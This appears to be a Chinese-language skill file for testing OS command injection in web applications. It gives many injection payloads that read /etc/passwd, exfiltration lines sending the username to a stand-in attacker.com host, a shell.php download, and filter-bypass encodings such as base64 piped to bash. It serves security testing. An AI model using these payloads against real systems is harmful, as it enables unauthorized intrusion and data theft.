---
name: command-injection
description: >
  操作系统命令注入漏洞测试技能。覆盖 Linux 和 Windows 环境下的命令注入检测与验证，
  提供多种注入操作符、盲注检测方法、编码绕过策略和分步测试流程，
  适用于 Web 应用中命令执行类漏洞的发现与确认(CWE-77/CWE-78)。
---

# 命令注入测试技能

系统化检测和验证 Web 应用中的操作系统命令注入漏洞。
通过命令分隔符注入、时间延迟观测、带外数据外带等手段，
定位未经正确过滤的系统命令拼接点。

---

## 1. 命令注入基础

### 1.1 注入原理

应用程序将用户输入拼接到操作系统命令中执行：

```python
# 危险代码示例
os.system("ping -c 1 " + user_input)
# 如果 user_input = "127.0.0.1; cat /etc/passwd"
# 实际执行: ping -c 1 127.0.0.1; cat /etc/passwd
```

### 1.2 命令分隔符与操作符

| 操作符 | Linux | Windows | 说明 |
|--------|-------|---------|------|
| `;` | 支持 | 不支持 | 顺序执行，不论前一个命令成功与否 |
| `\|` | 支持 | 支持 | 管道，前一个命令的输出作为后一个的输入 |
| `\|\|` | 支持 | 支持 | 前一个命令失败时执行后一个 |
| `&&` | 支持 | 支持 | 前一个命令成功时执行后一个 |
| `\n` (0x0a) | 支持 | 支持 | 换行符作为命令分隔 |
| `` ` `` | 支持 | 不支持 | 反引号，命令替换 |
| `$()` | 支持 | 不支持 | 命令替换（推荐形式） |
| `&` | 支持 | 支持 | 后台执行 |

---

## 2. 测试方法论

### 2.1 第一阶段：注入点识别

常见的命令注入入口：
- 文件名处理参数（转换、压缩、解压）
- 网络工具参数（ping、nslookup、traceroute）
- 系统管理接口（进程管理、服务控制）
- PDF/文档生成（使用 wkhtmltopdf、ImageMagick 等）
- 邮件发送参数（收件人、主题）
- Git/SVN 操作参数

### 2.2 第二阶段：有回显注入探测

依次尝试各种分隔符：

```bash
# Linux
; id
| id
|| id
&& id
`id`
$(id)
; cat /etc/passwd
| cat /etc/passwd

# Windows
& whoami
| whoami
|| whoami
&& whoami
```

### 2.3 第三阶段：盲注检测

当无法直接看到命令输出时：

**时间延迟法**

```bash
# Linux
; sleep 10
| sleep 10
& sleep 10
`sleep 10`
$(sleep 10)
; ping -c 10 127.0.0.1

# Windows
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
& timeout /t 10
```

观察响应时间是否明显增加（比正常响应多 10 秒左右）。

**DNS 外带法**

```bash
# Linux
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
; host $(whoami).attacker.com
| curl http://attacker.com/?d=$(whoami)
`nslookup $(id).attacker.com`

# Windows
& nslookup %username%.attacker.com
| powershell -c "Invoke-WebRequest http://attacker.com/?d=$env:username"
```

**文件写入法**

```bash
# Linux
; echo INJECTION_PROOF > /tmp/proof.txt
; id > /var/www/html/proof.txt

# Windows
& echo INJECTION_PROOF > C:\inetpub\wwwroot\proof.txt
```

### 2.4 第四阶段：影响评估

成功注入后评估：
- 当前运行用户权限（root/www-data/SYSTEM？）
- 网络访问能力（能否外连？）
- 文件系统读写权限
- 是否在容器/沙箱环境中

---

## 3. 绕过策略

### 3.1 空格绕过

当空格被过滤时：

```bash
# Linux - 使用 $IFS（Internal Field Separator，默认为空格）
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}
;cat</etc/passwd
;cat%09/etc/passwd   # Tab

# Linux - 使用花括号扩展
{cat,/etc/passwd}
{ls,-la,/tmp}

# Windows
type%09C:\windows\win.ini
dir%09C:\
```

### 3.2 关键字绕过

当 `cat`, `ls`, `whoami` 等被过滤时：

```bash
# Linux - 字符串拼接
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Linux - 变量拼接
a=ca;b=t;$a$b /etc/passwd

# Linux - 通配符
/bin/ca? /etc/passwd
/bin/c[a]t /etc/passwd
/???/??t /etc/passwd

# Linux - Base64 编码执行
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)

# Linux - 替代命令
# cat 替代: tac, nl, less, more, head, tail, sort, uniq, rev, xxd, od
tac /etc/passwd
nl /etc/passwd
head -n 100 /etc/passwd
```

### 3.3 路径绕过

当 `/etc/passwd` 等路径被过滤时：

```bash
# 使用环境变量
cat ${HOME}/../etc/passwd
cat $HOME/../etc/passwd

# 使用通配符
cat /e?c/p?sswd
cat /e*c/pa*wd
cat /etc/pass??

# 使用路径遍历
cat /etc/./passwd
cat /etc/../etc/passwd
```

### 3.4 反引号与 $() 绕过

```bash
# 嵌套命令替换
$($(echo cat) /etc/passwd)

# 使用 printf
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# 使用 $'\x' 语法
$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
```

### 3.5 编码绕过

```bash
# URL 编码（如果经过 Web 层解码）
%0aid        # 换行 + id
%26id        # & + id

# Hex 编码
echo -e '\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# Octal 编码
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

---

## 4. 特殊场景

### 4.1 受限字符集注入

某些应用只允许字母数字，此时：

```bash
# 利用 $0 获取当前 shell
# 利用 $? 获取上一个命令的退出码
# 利用 $$ 获取当前 PID
```

### 4.2 参数注入 (Argument Injection)

用户输入作为命令参数而非命令本身：

```bash
# 如果命令是 curl USER_INPUT
# 注入: --output /tmp/shell.php http://attacker.com/shell.php
# 效果: curl --output /tmp/shell.php http://attacker.com/shell.php

# 如果命令是 tar cf archive.tar USER_INPUT
# 注入: --checkpoint=1 --checkpoint-action=exec=id
```

### 4.3 Windows 特有技巧

```cmd
REM 使用 ^ 转义符
w^h^o^a^m^i

REM 使用环境变量切片
%ComSpec:~0,1%%ComSpec:~-13,1%  (提取 "c" 和 "d")

REM PowerShell 编码执行
powershell -enc <base64_encoded_command>

REM 使用 set 和 call
set a=who&& set b=ami&& call %a%%b%
```

---

## 5. 测试检查清单

- [ ] 识别所有可能调用系统命令的功能点
- [ ] 使用基础分隔符（`;`, `|`, `||`, `&&`）探测
- [ ] 尝试反引号和 `$()` 命令替换
- [ ] 执行时间延迟盲注验证
- [ ] 尝试 DNS/HTTP 带外数据外带
- [ ] 确认操作系统类型（Linux/Windows）
- [ ] 测试空格和关键字绕过
- [ ] 评估当前用户权限
- [ ] 检查参数注入的可能性
- [ ] 记录完整的注入点、操作符和 Payload
